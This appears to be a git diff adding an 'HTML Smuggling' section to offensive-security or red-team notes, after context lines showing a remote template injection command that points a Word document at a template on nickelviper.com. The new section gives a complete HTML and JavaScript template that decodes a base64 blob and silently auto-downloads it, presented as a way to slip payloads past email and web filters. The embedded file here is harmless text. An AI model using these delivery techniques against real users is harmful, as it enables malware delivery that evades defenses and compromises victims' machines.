@@ -115,3 +115,54 @@ Using Word's ability to create a doc from a template, which may hold a macro tha
 
 [remoteinjector](https://github.com/JohnWoodman/remoteinjector) automates this process: ```python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx```
 
+## HTML Smuggling
+
+Using JavaScript to hide files from content filters. Email and web scanners can remove these. Embed the payload into HTML and use JavaScript to construct URLs by the browser at runtime to evade this.
+
+Template:
+```
+<html>
+    <head>
+        <title>HTML Smuggling</title>
+    </head>
+    <body>
+        <p>This is all the user will see...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
+```
+
+There are no hardcoded hyperlinks and the content type of the page itself is just text/html.
+
+Use ```echo -en "This is a smuggled file" | base64``` to generate a base64-encoded text file that will download when the page is browsed wihtout any user interaction. This file has MotW however.
+
+### Quick and dirty Python web server for testing
+```python3 -m http.server 8080```
+
+
